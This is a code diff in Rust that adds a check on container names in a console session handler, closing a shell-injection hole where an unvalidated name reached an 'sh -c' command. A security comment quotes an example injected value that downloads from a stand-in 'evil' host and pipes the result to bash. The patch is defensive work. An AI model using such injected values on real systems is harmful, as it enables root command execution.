@@ -372,6 +372,19 @@ async fn console_session(
                     if let Some(idx) = target_str.find(':') {
                         let runtime = &target_str[..idx];
                         let container = &target_str[idx+1..];
+                        // SECURITY: `container` is the only attacker-controlled
+                        // segment of an install target (component/install_script
+                        // come from a fixed allowlist) and is interpolated into a
+                        // `sh -c` string below. The install-family console types
+                        // are exempt from the up-front is_safe_name() check in
+                        // console_ws(), so validate the container name HERE or a
+                        // crafted name like `x';curl evil|bash;'` would break out
+                        // of the single-quoted shell context (root command exec).
+                        if !crate::auth::is_safe_name(container) {
+                            let _ = session.text("\r\n\x1b[31mInvalid container name\x1b[0m\r\n").await;
+                            let _ = session.close(None).await;
+                            return;
+                        }
                         match runtime {
                             "docker" => {
                                 if is_inline {
